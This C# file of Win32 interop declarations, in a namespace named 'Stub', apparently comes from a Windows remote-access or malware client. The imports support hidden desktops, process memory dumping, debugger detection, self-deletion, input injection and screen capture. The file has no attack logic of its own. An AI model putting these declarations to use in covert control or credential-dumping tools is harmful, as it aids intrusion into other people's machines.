using System;
using System.Drawing;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Stub;

internal class Native
{
	public enum EXECUTION_STATE : uint
	{
		ES_CONTINUOUS = 2147483648u,
		ES_DISPLAY_REQUIRED = 2u,
		ES_SYSTEM_REQUIRED = 1u
	}

	public struct RECT
	{
		public int Left;

		public int Top;

		public int Right;

		public int Bottom;
	}

	public delegate bool EnumDelegate(IntPtr hWnd, int lParam);

	public struct IMAGE_SECTION_HEADER
	{
		public unsafe fixed byte Name[8];

		public uint VirtualSize;

		public uint VirtualAddress;

		public uint SizeOfRawData;

		public uint PointerToRawData;

		public uint PointerToRelocations;

		public uint PointerToLinenumbers;

		public ushort NumberOfRelocations;

		public ushort NumberOfLinenumbers;

		public uint Characteristics;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	internal struct MINIDUMP_IO_CALLBACK
	{
		internal IntPtr Handle;

		internal ulong Offset;

		internal IntPtr Buffer;

		internal int BufferBytes;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	internal struct MINIDUMP_CALLBACK_INFORMATION
	{
		internal MinidumpCallbackRoutine CallbackRoutine;

		internal IntPtr CallbackParam;
	}

	[StructLayout(LayoutKind.Sequential, Pack = 1)]
	internal struct MINIDUMP_CALLBACK_INPUT
	{
		internal int ProcessId;

		internal IntPtr ProcessHandle;

		internal MINIDUMP_CALLBACK_TYPE CallbackType;

		internal MINIDUMP_IO_CALLBACK Io;
	}

	[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
	internal delegate bool MinidumpCallbackRoutine(IntPtr CallbackParam, IntPtr CallbackInput, IntPtr CallbackOutput);

	internal enum HRESULT : uint
	{
		S_FALSE = 1u,
		S_OK = 0u,
		E_INVALIDARG = 2147942487u,
		E_OUTOFMEMORY = 2147942414u
	}

	internal struct MINIDUMP_CALLBACK_OUTPUT
	{
		internal HRESULT status;
	}

	internal enum MINIDUMP_CALLBACK_TYPE
	{
		ModuleCallback = 0,
		ThreadCallback = 1,
		ThreadExCallback = 2,
		IncludeThreadCallback = 3,
		IncludeModuleCallback = 4,
		MemoryCallback = 5,
		CancelCallback = 6,
		WriteKernelMinidumpCallback = 7,
		KernelMinidumpStatusCallback = 8,
		RemoveMemoryCallback = 9,
		IncludeVmRegionCallback = 10,
		IoStartCallback = 11,
		IoWriteAllCallback = 12,
		IoFinishCallback = 13,
		ReadMemoryFailureCallback = 14,
		SecondaryFlagsCallback = 15,
		IsProcessSnapshotCallback = 16,
		VmStartCallback = 17,
		VmQueryCallback = 18,
		VmPreReadCallback = 19,
		VmPostReadCallback = 20
	}

	public enum UDP_TABLE_CLASS
	{
		UDP_TABLE_BASIC = 0,
		UDP_TABLE_OWNER_PID = 1,
		UDP_TABLE_OWNER_MODULE = 2
	}

	public struct UdpRow
	{
		public uint localAddr;

		[MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
		public byte[] localPort;

		public int owningPid;

		public IPAddress LocalAddress => new IPAddress(this.localAddr);

		public ushort LocalPort => BitConverter.ToUInt16(new byte[2]
		{
			this.localPort[1],
			this.localPort[0]
		}, 0);
	}

	public struct UdpTable
	{
		public uint dwNumEntries;

		private UdpRow table;
	}

	public enum TCP_TABLE_TYPE
	{
		TCP_TABLE_BASIC_LISTENER = 0,
		TCP_TABLE_BASIC_CONNECTIONS = 1,
		TCP_TABLE_BASIC_ALL = 2,
		TCP_TABLE_OWNER_PID_LISTENER = 3,
		TCP_TABLE_OWNER_PID_CONNECTIONS = 4,
		TCP_TABLE_OWNER_PID_ALL = 5,
		TCP_TABLE_OWNER_MODULE_LISTENER = 6,
		TCP_TABLE_OWNER_MODULE_CONNECTIONS = 7,
		TCP_TABLE_OWNER_MODULE_ALL = 8
	}

	public enum TCP_CONNECTION_STATE
	{
		CLOSED = 1,
		LISTENING = 2,
		SYN_SENT = 3,
		SYN_RCVD = 4,
		ESTABLISHED = 5,
		FIN_WAIT_1 = 6,
		FIN_WAIT_2 = 7,
		CLOSE_WAIT = 8,
		CLOSING = 9,
		LAST_ACK = 10,
		TIME_WAIT = 11,
		DELETE_TCP = 12
	}

	public struct MIB_TCPROW_OWNER_PID
	{
		public uint state;

		public uint localAddr;

		public byte localPort1;

		public byte localPort2;

		public byte localPort3;

		public byte localPort4;

		public uint remoteAddr;

		public byte remotePort1;

		public byte remotePort2;

		public byte remotePort3;

		public byte remotePort4;

		public int owningPid;

		public ushort LocalPort => BitConverter.ToUInt16(new byte[2] { this.localPort2, this.localPort1 }, 0);

		public ushort RemotePort => BitConverter.ToUInt16(new byte[2] { this.remotePort2, this.remotePort1 }, 0);
	}

	public struct MIB_TCPTABLE_OWNER_PID
	{
		public uint dwNumEntries;

		private MIB_TCPROW_OWNER_PID table;
	}

	public struct STARTUPINFO
	{
		public int cb;

		public string lpReserved;

		public string lpDesktop;

		public string lpTitle;

		public int dwX;

		public int dwY;

		public int dwXSize;

		public int dwYSize;

		public int dwXCountChars;

		public int dwYCountChars;

		public int dwFillAttribute;

		public int dwFlags;

		public short wShowWindow;

		public short cbReserved2;

		public IntPtr lpReserved2;

		public IntPtr hStdInput;

		public IntPtr hStdOutput;

		public IntPtr hStdError;
	}

	public struct PROCESS_INFORMATION
	{
		public IntPtr hProcess;

		public IntPtr hThread;

		public int dwProcessId;

		public int dwThreadId;
	}

	[Flags]
	public enum SHGFI
	{
		SHGFI_ICON = 0x100,
		SHGFI_DISPLAYNAME = 0x200,
		SHGFI_TYPENAME = 0x400,
		SHGFI_ATTRIBUTES = 0x800,
		SHGFI_ICONLOCATION = 0x1000,
		SHGFI_EXETYPE = 0x2000,
		SHGFI_SYSICONINDEX = 0x4000,
		SHGFI_LINKOVERLAY = 0x8000,
		SHGFI_SELECTED = 0x10000,
		SHGFI_ATTR_SPECIFIED = 0x20000,
		SHGFI_LARGEICON = 0,
		SHGFI_SMALLICON = 1,
		SHGFI_OPENICON = 2,
		SHGFI_SHELLICONSIZE = 4,
		SHGFI_PIDL = 8,
		SHGFI_USEFILEATTRIBUTES = 0x10,
		SHGFI_ADDOVERLAYS = 0x20,
		SHGFI_OVERLAYINDEX = 0x40
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Auto)]
	public struct SHFILEINFO
	{
		public IntPtr hIcon;

		public int iIcon;

		public uint dwAttributes;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
		public string szDisplayName;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 80)]
		public string szTypeName;
	}

	[Flags]
	public enum DiGetClassFlags : uint
	{
		DIGCF_DEFAULT = 1u,
		DIGCF_PRESENT = 2u,
		DIGCF_ALLCLASSES = 4u,
		DIGCF_PROFILE = 8u,
		DIGCF_DEVICEINTERFACE = 0x10u
	}

	public struct SP_DEVINFO_DATA
	{
		public int Size;

		public Guid ClassGuid;

		public int DevInst;

		public IntPtr Reserved;
	}

	public enum SPDRP : uint
	{
		SPDRP_DEVICEDESC = 0u,
		SPDRP_HARDWAREID = 1u,
		SPDRP_COMPATIBLEIDS = 2u,
		SPDRP_UNUSED0 = 3u,
		SPDRP_SERVICE = 4u,
		SPDRP_UNUSED1 = 5u,
		SPDRP_UNUSED2 = 6u,
		SPDRP_CLASS = 7u,
		SPDRP_CLASSGUID = 8u,
		SPDRP_DRIVER = 9u,
		SPDRP_CONFIGFLAGS = 10u,
		SPDRP_MFG = 11u,
		SPDRP_FRIENDLYNAME = 12u,
		SPDRP_LOCATION_INFORMATION = 13u,
		SPDRP_PHYSICAL_DEVICE_OBJECT_NAME = 14u,
		SPDRP_CAPABILITIES = 15u,
		SPDRP_UI_NUMBER = 16u,
		SPDRP_UPPERFILTERS = 17u,
		SPDRP_LOWERFILTERS = 18u,
		SPDRP_BUSTYPEGUID = 19u,
		SPDRP_LEGACYBUSTYPE = 20u,
		SPDRP_BUSNUMBER = 21u,
		SPDRP_ENUMERATOR_NAME = 22u,
		SPDRP_SECURITY = 23u,
		SPDRP_SECURITY_SDS = 24u,
		SPDRP_DEVTYPE = 25u,
		SPDRP_EXCLUSIVE = 26u,
		SPDRP_CHARACTERISTICS = 27u,
		SPDRP_ADDRESS = 28u,
		SPDRP_UI_NUMBER_DESC_FORMAT = 29u,
		SPDRP_DEVICE_POWER_DATA = 30u,
		SPDRP_REMOVAL_POLICY = 31u,
		SPDRP_REMOVAL_POLICY_HW_DEFAULT = 32u,
		SPDRP_REMOVAL_POLICY_OVERRIDE = 33u,
		SPDRP_INSTALL_STATE = 34u,
		SPDRP_LOCATION_PATHS = 35u
	}

	public enum StateChangeAction
	{
		Enable = 1,
		Disable = 2,
		PropChange = 3,
		Start = 4,
		Stop = 5
	}

	[Flags]
	public enum Scopes
	{
		Global = 1,
		ConfigSpecific = 2,
		ConfigGeneral = 4
	}

	public struct PropertyChangeParameters
	{
		public int Size;

		public DiFunction DiFunction;

		public StateChangeAction StateChange;

		public Scopes Scope;

		public int HwProfile;
	}

	public enum DiFunction
	{
		SelectDevice = 1,
		InstallDevice = 2,
		AssignResources = 3,
		Properties = 4,
		Remove = 5,
		FirstTimeSetup = 6,
		FoundDevice = 7,
		SelectClassDrivers = 8,
		ValidateClassDrivers = 9,
		InstallClassDrivers = 10,
		CalcDiskSpace = 11,
		DestroypublicData = 12,
		ValidateDriver = 13,
		Detect = 15,
		InstallWizard = 16,
		DestroyWizardData = 17,
		PropertyChange = 18,
		EnableClass = 19,
		DetectVerify = 20,
		InstallDeviceFiles = 21,
		UnRemove = 22,
		SelectBestCompatDrv = 23,
		AllowInstall = 24,
		RegisterDevice = 25,
		NewDeviceWizardPreSelect = 26,
		NewDeviceWizardSelect = 27,
		NewDeviceWizardPreAnalyze = 28,
		NewDeviceWizardPostAnalyze = 29,
		NewDeviceWizardFinishInstall = 30,
		Unused1 = 31,
		InstallInterfaces = 32,
		DetectCancel = 33,
		RegisterCoInstallers = 34,
		AddPropertyPageAdvanced = 35,
		AddPropertyPageBasic = 36,
		Reserved1 = 37,
		Troubleshooter = 38,
		PowerMessageWake = 39,
		AddRemotePropertyPageAdvanced = 40,
		UpdateDriverUI = 41,
		Reserved2 = 48
	}

	public struct CURSORINFO
	{
		public int cbSize;

		public int flags;

		public IntPtr hCursor;

		public POINTAPI ptScreenPos;
	}

	public struct POINTAPI
	{
		public int x;

		public int y;
	}

	public enum FileInformationClass
	{
		FileBasicInfo = 0,
		FileStandardInfo = 1,
		FileNameInfo = 2,
		FileRenameInfo = 3,
		FileDispositionInfo = 4,
		FileAllocationInfo = 5,
		FileEndOfFileInfo = 6,
		FileStreamInfo = 7,
		FileCompressionInfo = 8,
		FileAttributeTagInfo = 9,
		FileIdBothDirectoryInfo = 10,
		FileIdBothDirectoryRestartInfo = 11,
		FileIoPriorityHintInfo = 12,
		FileRemoteProtocolInfo = 13,
		FileFullDirectoryInfo = 14,
		FileFullDirectoryRestartInfo = 15,
		FileStorageInfo = 16,
		FileAlignmentInfo = 17,
		FileIdInfo = 18,
		FileIdExtdDirectoryInfo = 19,
		FileIdExtdDirectoryRestartInfo = 20
	}

	public struct FILE_DISPOSITION_INFO
	{
		public bool DeleteFile;
	}

	[StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
	public struct FILE_RENAME_INFO
	{
		public uint ReplaceIfExists;

		public IntPtr RootDirectory;

		public uint FileNameLength;

		[MarshalAs(UnmanagedType.ByValTStr, SizeConst = 256)]
		public string FileName;
	}

	public const uint MAX_PATH = 260u;

	public const int NORMAL_PRIORITY_CLASS = 32;

	public const uint DESKTOP_CREATEWINDOW = 2u;

	public const uint DESKTOP_ENUMERATE = 64u;

	public const uint DESKTOP_WRITEOBJECTS = 128u;

	public const uint DESKTOP_SWITCHDESKTOP = 256u;

	public const uint DESKTOP_CREATEMENU = 4u;

	public const uint DESKTOP_HOOKCONTROL = 8u;

	public const uint DESKTOP_READOBJECTS = 1u;

	public const uint DESKTOP_JOURNALRECORD = 16u;

	public const uint DESKTOP_JOURNALPLAYBACK = 32u;

	public const uint AccessRights = 511u;

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern EXECUTION_STATE SetThreadExecutionState(EXECUTION_STATE esFlags);

	[DllImport("advapi32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern bool ProcessIdToSessionId(uint processID, out uint sessionID);

	[DllImport("kernel32.dll", SetLastError = true)]
	public static extern uint GetCurrentProcessId();

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool ShowWindow(IntPtr hWnd, [MarshalAs(UnmanagedType.I4)] int nCmdShow);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool PostMessage(IntPtr hWnd, uint Msg, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern IntPtr SendMessage(int hWnd, int Msg, int wparam, int lparam);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

	[DllImport("user32.dll")]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool IsWindowVisible(IntPtr hWnd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool EnumDesktopWindows(IntPtr hDesktop, EnumDelegate lpEnumCallbackFunction, IntPtr lParam);

	[DllImport("user32.dll")]
	public static extern bool PrintWindow(IntPtr hwnd, IntPtr hdcBlt, uint nFlags);

	[DllImport("user32.dll")]
	public static extern bool GetWindowRect(IntPtr hWnd, ref RECT lpRect);

	[DllImport("user32.dll")]
	public static extern IntPtr WindowFromPoint(Point p);

	[DllImport("user32.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool IsZoomed(IntPtr hWnd);

	[DllImport("user32.dll", CharSet = CharSet.Auto, ExactSpelling = true)]
	public static extern IntPtr GetParent(IntPtr hWnd);

	[DllImport("user32.dll")]
	public static extern int GetSystemMetrics(int smIndex);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto)]
	public static extern int RegOpenKeyEx(UIntPtr hKey, string subKey, uint ulOptions, uint samDesired, out IntPtr hkResult);

	[DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public static extern bool IsDebuggerPresent();

	[DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode, SetLastError = true)]
	public unsafe static extern void* GetCurrentProcess();

	[DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public unsafe static extern bool CheckRemoteDebuggerPresent(void* hProcess, bool* pbDebuggerPresent);

	[DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public unsafe static extern bool CloseHandle(void* hObject);

	[DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode, SetLastError = true)]
	public unsafe static extern void* GetModuleHandle(string lpModuleName);

	[DllImport("kernel32.dll", BestFitMapping = false, CharSet = CharSet.Unicode, SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	public unsafe static extern bool GetModuleFileName(void* hModule, StringBuilder lpFilename, uint nSize);

	[DllImport("user32.dll")]
	public static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	public static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	[DllImport("kernel32.dll")]
	public static extern bool IsWow64Process(IntPtr hProcess, out bool lpSystemInfo);

	[DllImport("dbghelp.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, ExactSpelling = true, SetLastError = true)]
	internal static extern bool MiniDumpWriteDump(IntPtr hProcess, uint processId, IntPtr hFile, uint dumpType, IntPtr expParam, IntPtr userStreamParam, IntPtr callbackParam);

	[DllImport("iphlpapi.dll", SetLastError = true)]
	public static extern uint GetExtendedUdpTable(IntPtr pUdpTable, ref int dwOutBufLen, bool sort, int ipVersion, UDP_TABLE_CLASS tblClass, uint reserved = 0u);

	[DllImport("iphlpapi.dll", SetLastError = true)]
	public static extern uint GetExtendedTcpTable(IntPtr pTcpTable, ref int dwOutBufLen, bool sort, int ipVersion, TCP_TABLE_TYPE tblClass, int reserved);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern IntPtr CreateDesktop(string lpszDesktop, IntPtr lpszDevice, IntPtr pDevmode, int dwFlags, uint dwDesiredAccess, IntPtr lpsa);

	[DllImport("user32.dll", SetLastError = true)]
	internal static extern bool SetThreadDesktop(IntPtr hDesktop);

	[DllImport("user32.dll")]
	public static extern IntPtr GetThreadDesktop(int dwThreadId);

	[DllImport("kernel32.dll")]
	public static extern int GetCurrentThreadId();

	[DllImport("kernel32.dll")]
	internal static extern bool CreateProcess(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, ref PROCESS_INFORMATION lpProcessInformation);

	[DllImport("shell32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr SHGetFileInfo(string pszPath, uint dwFileAttribs, out SHFILEINFO psfi, uint cbFileInfo, SHGFI uFlags);

	[DllImport("setupapi.dll", CharSet = CharSet.Auto)]
	internal static extern IntPtr SetupDiGetClassDevs(ref Guid ClassGuid, IntPtr Enumerator, IntPtr hwndParent, DiGetClassFlags Flags);

	[DllImport("setupapi.dll", SetLastError = true)]
	internal static extern bool SetupDiEnumDeviceInfo(IntPtr DeviceInfoSet, uint MemberIndex, ref SP_DEVINFO_DATA DeviceInfoData);

	[DllImport("setupapi.dll", SetLastError = true)]
	internal static extern bool SetupDiDestroyDeviceInfoList(IntPtr DeviceInfoSet);

	[DllImport("setupapi.dll", CharSet = CharSet.Auto, SetLastError = true)]
	internal static extern bool SetupDiGetDeviceRegistryProperty(IntPtr deviceInfoSet, ref SP_DEVINFO_DATA deviceInfoData, SPDRP property, out uint propertyRegDataType, StringBuilder propertyBuffer, uint propertyBufferSize, out uint requiredSize);

	[DllImport("setupapi.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool SetupDiSetClassInstallParams(IntPtr deviceInfoSet, [In] ref SP_DEVINFO_DATA deviceInfoData, [In] ref PropertyChangeParameters classInstallParams, int classInstallParamsSize);

	[DllImport("setupapi.dll", SetLastError = true)]
	[return: MarshalAs(UnmanagedType.Bool)]
	internal static extern bool SetupDiCallClassInstaller(DiFunction installFunction, IntPtr deviceInfoSet, [In] ref SP_DEVINFO_DATA deviceInfoData);

	[DllImport("user32.dll")]
	public static extern void mouse_event(int dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);

	[DllImport("user32.dll")]
	public static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

	[DllImport("user32.dll")]
	public static extern bool GetCursorInfo(out CURSORINFO pci);

	[DllImport("user32.dll")]
	public static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

	[DllImport("kernel32", CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern IntPtr CreateFileW(string filename, uint desiredAccess, uint shareMode, IntPtr attributes, uint creationDisposition, uint flagsAndAttributes, IntPtr templateFile);

	[DllImport("kernel32.dll", CallingConvention = CallingConvention.StdCall, CharSet = CharSet.Unicode, SetLastError = true)]
	public static extern bool SetFileInformationByHandle(IntPtr handle, FileInformationClass fileinformationclass, IntPtr pfileinformation, int buffersize);

	[DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern bool CloseHandle(IntPtr hObject);

	[DllImport("user32.dll", SetLastError = true)]
	public static extern bool SetProcessDPIAware();
}
